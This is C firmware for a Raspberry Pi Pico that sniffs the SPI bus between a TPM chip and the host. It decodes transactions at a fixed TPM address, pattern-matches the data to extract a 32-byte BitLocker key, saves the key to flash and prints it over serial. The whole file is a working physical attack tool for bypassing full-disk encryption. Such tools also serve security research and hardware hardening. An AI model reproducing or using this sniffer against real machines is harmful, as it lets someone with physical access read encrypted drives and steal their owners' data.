#include <stdio.h>
#include <cstring>
#include "pico/stdlib.h"
#include "hardware/pio.h"
#include "hardware/clocks.h"
#include "hardware/gpio.h"
#include "hardware/flash.h"
#include "hardware/sync.h"
#include "hardware/irq.h"
#include "flash_storage.h"
#include "spi_sniffer.pio.h"

// --- Configuration ---
#define PIN_SPI0_CS   0
#define PIN_SPI0_SCK  1
#define PIN_SPI0_MOSI 2
#define PIN_SPI0_MISO 3
#define LED_PIN 25


#define TPM_BITLOCKER_ADDR 0x00D40024
#define KEY_PATTERN_LEN 44
#define KEY_DATA_LEN 32
#define MAX_TRANSACTION_SIZE 64
#define STREAM_BUFFER_SIZE 512
#define CMD_BUFFER_SIZE 64

// --- Named Constants ---
#define SPI_READ_FLAG 0x80
#define SPI_WAIT_READY 0x01
#define STREAM_READ_BIT 0x8000

// --- State Machine ---
typedef enum {
    STATE_IDLE, STATE_ADDR, STATE_WAIT_READY, STATE_DATA
} sniff_state_t;

typedef struct {
    sniff_state_t state;
    uint8_t addr_bytes, xfer_size, data_count;
    uint32_t address;
    bool is_read_op;
} __attribute__((packed)) machine_state_t;

// --- Buffers and State ---
static machine_state_t machine_state = {
    .state = STATE_IDLE,
    .addr_bytes = 0,
    .xfer_size = 0,
    .address = 0,
    .is_read_op = false
};
static uint8_t data_buffer[MAX_TRANSACTION_SIZE];
static uint8_t window[KEY_PATTERN_LEN];
static int win_len = 0;
static uint8_t pending_key[KEY_DATA_LEN];
static char cmd_buffer[CMD_BUFFER_SIZE];
static int cmd_pos = 0;

// --- Volatile Variables ---
static volatile uint32_t transactions_processed = 0;
static volatile uint32_t keys_found = 0;
static volatile int stream_head = 0;
static volatile int stream_tail = 0;
static volatile bool stream_active = false;
static volatile bool key_save_pending = false;
static volatile uint16_t stream_buffer[STREAM_BUFFER_SIZE];

// --- Helper Functions ---

// NOTE: stream_push_isr must be called from within a critical section
static inline void stream_push_isr(uint16_t entry) {
    int head = stream_head;
    int new_head = (head + 1) % STREAM_BUFFER_SIZE;
    if (new_head != stream_tail) {
        stream_buffer[head] = entry;
        stream_head = new_head;
    }
    // Drop if full
}

static inline uint16_t stream_pop(void) {
    uint32_t ints = save_and_disable_interrupts();
    int tail = stream_tail;
    if (tail == stream_head) {
        return 0xFFFF; // Empty
    }
    uint16_t entry = stream_buffer[tail];
    stream_tail = (tail + 1) % STREAM_BUFFER_SIZE;
    restore_interrupts(ints);
    return entry;
}

// --- Core Logic Functions ---
void processSPIByte(uint8_t mosi, uint8_t miso);
bool checkAndStoreKey(uint8_t* buffer, int len);
void processCommand(const char* cmd);

int main() {
    stdio_init_all();
    setbuf(stdout, NULL);
    gpio_init(LED_PIN);
    gpio_set_dir(LED_PIN, GPIO_OUT);
    gpio_put(LED_PIN, 0);  // Start with LED off
    printf("\n=== BitLocker TPM Sniffer ===\n");

    uint8_t boot_key[KEY_DATA_LEN];
    if (flash_retrieve_key(boot_key)) {
        printf("\n[!!!] STORED KEY DETECTED AT BOOT\n");
        gpio_put(LED_PIN, 1);
    }

    // PIO Setup
    PIO pio = pio0;
    uint sm_mosi = 0, sm_miso = 1;
    uint offset = pio_add_program(pio, &spi_sniffer_program);

    auto setup_pio_sm = [&](uint sm, uint data_pin, uint cs_pin, uint sck_pin) {
        pio_sm_config c = spi_sniffer_program_get_default_config(offset);
        sm_config_set_in_pins(&c, data_pin);
        sm_config_set_in_shift(&c, true, false, 8);
        gpio_set_function(cs_pin, GPIO_FUNC_PIO0);
        gpio_set_input_enabled(cs_pin, true);
        gpio_set_pulls(cs_pin, true, false);
        gpio_set_function(sck_pin, GPIO_FUNC_PIO0);
        gpio_set_input_enabled(sck_pin, true);
        gpio_set_function(data_pin, GPIO_FUNC_PIO0);
        gpio_set_input_enabled(data_pin, true);
        sm_config_set_jmp_pin(&c, cs_pin);
        pio_sm_init(pio, sm, offset, &c);
        pio_sm_set_enabled(pio, sm, true);
    };

    setup_pio_sm(sm_mosi, PIN_SPI0_MOSI, PIN_SPI0_CS, PIN_SPI0_SCK);
    setup_pio_sm(sm_miso, PIN_SPI0_MISO, PIN_SPI0_CS, PIN_SPI0_SCK);

    // --- Main Loop ---
    while (true) {
        // Serial Input
        int c = getchar_timeout_us(0);
        if (c != PICO_ERROR_TIMEOUT) {
            if (c == '\r' || c == '\n') {
                cmd_buffer[cmd_pos] = '\0';
                processCommand(cmd_buffer);
                cmd_pos = 0;
            } else if (cmd_pos < CMD_BUFFER_SIZE - 1) {
                cmd_buffer[cmd_pos++] = c;
            }
        }

        // Process SPI
        bool mosi_ready = !pio_sm_is_rx_fifo_empty(pio, sm_mosi);
        bool miso_ready = !pio_sm_is_rx_fifo_empty(pio, sm_miso);

        if (mosi_ready && miso_ready) {
            uint32_t ints = save_and_disable_interrupts();
            uint8_t mosi_byte = (uint8_t)(pio_sm_get(pio, sm_mosi) >> 24);
            uint8_t miso_byte = (uint8_t)(pio_sm_get(pio, sm_miso) >> 24);
            processSPIByte(mosi_byte, miso_byte);
            restore_interrupts(ints);
        }

        // Stream output
        uint32_t ints = save_and_disable_interrupts();
        bool active = stream_active && (stream_head != stream_tail);
        restore_interrupts(ints);

        if (active) {
            printf("DATA: ");
            for (int i = 0; i < 16; i++) {
                uint16_t entry = stream_pop();
                if (entry == 0xFFFF) break;
                uint8_t val = entry & 0xFF;
                printf("[%c]%02X ", (entry & STREAM_READ_BIT) ? 'R' : 'W', val);
            }
            printf("\n");
        }

        // Process found key
        ints = save_and_disable_interrupts();
        bool pending = key_save_pending;
        restore_interrupts(ints);

        if (pending) {
            ints = save_and_disable_interrupts();
            uint8_t local_key[KEY_DATA_LEN];
            memcpy(local_key, pending_key, KEY_DATA_LEN);
            key_save_pending = false;
            restore_interrupts(ints);

            flash_store_key(local_key);

            ints = save_and_disable_interrupts();
            keys_found++;
            restore_interrupts(ints);

            printf("\n[[[ !!! KEY FOUND AND STORED !!! ]]]\n");
            gpio_put(LED_PIN, 1);
        }
    }
}

void processSPIByte(uint8_t mosi, uint8_t miso) {

    switch(machine_state.state) {
        case STATE_IDLE:
            machine_state.is_read_op = (mosi & SPI_READ_FLAG) != 0;
            machine_state.xfer_size = (mosi & 0x3F) + 1;
            machine_state.address = 0;
            machine_state.addr_bytes = 0;
            machine_state.data_count = 0;
            machine_state.state = STATE_ADDR;
            break;

        case STATE_ADDR:
            machine_state.address = (machine_state.address << 8) | mosi;
            if (++machine_state.addr_bytes >= 3) {
                machine_state.state = (miso & SPI_WAIT_READY) ? STATE_DATA : STATE_WAIT_READY;
            }
            break;

        case STATE_WAIT_READY:
            if (miso == SPI_WAIT_READY) {
                machine_state.state = STATE_DATA;
            }
            break;

        case STATE_DATA:
            if (machine_state.data_count >= MAX_TRANSACTION_SIZE) {
                machine_state.state = STATE_IDLE;
                break;
            }

            uint8_t data_byte = machine_state.is_read_op ? miso : mosi;
            data_buffer[machine_state.data_count++] = data_byte;

            if (stream_active) {
                stream_push_isr(data_byte | (machine_state.is_read_op ? STREAM_READ_BIT : 0));
            }

            if (machine_state.data_count >= machine_state.xfer_size) {
                transactions_processed++;

                if (machine_state.address == TPM_BITLOCKER_ADDR) {
                    if (checkAndStoreKey(data_buffer, machine_state.data_count)) {
                        win_len = 0;
                    }
                }
                machine_state.state = STATE_IDLE;
            }
            break;
    }

}

// Simplified sliding window - maintains last 44 bytes like Python version
static int last_scanned = 0;  // Moved outside function for proper scope

bool checkAndStoreKey(uint8_t* buffer, int len) {
    if (len <= 0 || len > MAX_TRANSACTION_SIZE) return false;

    // Add new data to window
    for (int i = 0; i < len; i++) {
        // Shift window left by one and add new byte at end
        memmove(window, window + 1, KEY_PATTERN_LEN - 1);
        window[KEY_PATTERN_LEN - 1] = buffer[i];
        win_len = (win_len < KEY_PATTERN_LEN) ? win_len + 1 : KEY_PATTERN_LEN;
    }

    if (win_len < KEY_PATTERN_LEN) return false;

    // Scan for pattern
    for (int i = last_scanned; i <= win_len - KEY_PATTERN_LEN; i++) {
        if (window[i+0] == 0x2C &&
            window[i+1] == 0x00 &&
            window[i+2] <= 0x06 &&
            window[i+3] == 0x00 &&
            window[i+4] >= 0x01 && window[i+4] <= 0x09 &&
            window[i+5] == 0x00 &&
            window[i+6] <= 0x01 &&
            window[i+7] == 0x00 &&
            window[i+8] <= 0x05 &&
            window[i+9] == 0x20 &&
            window[i+10] == 0x00 &&
            window[i+11] == 0x00) {
            uint32_t ints = save_and_disable_interrupts();
            memcpy(pending_key, &window[i + 12], KEY_DATA_LEN);
            key_save_pending = true;
            last_scanned = 0;
            restore_interrupts(ints);
            return true;
        }
    }

    last_scanned = win_len - KEY_PATTERN_LEN + 1;
    return false;
}

void processCommand(const char* cmd) {
    if (strcmp(cmd, "status") == 0) {
        uint32_t ints = save_and_disable_interrupts();
        uint32_t tp = transactions_processed;
        uint32_t kf = keys_found;
        restore_interrupts(ints);
        printf("Transactions: %lu\nKeys Found: %lu\n", tp, kf);
    }
    else if (strcmp(cmd, "getkey") == 0) {
        uint8_t key[32];
        if (flash_retrieve_key(key)) {
            printf("[+] Stored BitLocker Key: ");
            for (int i = 0; i < 32; i++) printf("%02X", key[i]);
            printf("\n");
        } else {
            printf("[-] No key stored in flash\n");
        }
    }
    else if (strcmp(cmd, "erasekey") == 0) {
        flash_erase_key();
        printf("[*] Key erased from flash\n");
        gpio_put(LED_PIN, 0);  // LED off when key erased
    }
    else if (strcmp(cmd, "stream") == 0) {
        uint32_t ints = save_and_disable_interrupts();
        stream_active = !stream_active;
        restore_interrupts(ints);
        printf("[*] Streaming %s\n", stream_active ? "ON" : "OFF");
    }
    else if (strcmp(cmd, "stats") == 0) {
        uint32_t ints = save_and_disable_interrupts();
        int wl = win_len;
        restore_interrupts(ints);
        printf("Window Len: %d\n", wl);
    }
    else if (strcmp(cmd, "clear") == 0) {
        uint32_t ints = save_and_disable_interrupts();
        transactions_processed = 0;
        keys_found = 0;
        win_len = 0;
        restore_interrupts(ints);
    }
    else if (strcmp(cmd, "reset") == 0) {
        uint32_t ints = save_and_disable_interrupts();
        machine_state.state = STATE_IDLE;
        machine_state.data_count = 0;
        win_len = 0;
        restore_interrupts(ints);
    }
    else {
        printf("Commands are: status, getkey, erasekey, stream, stats, clear, reset.\n");
    }
}
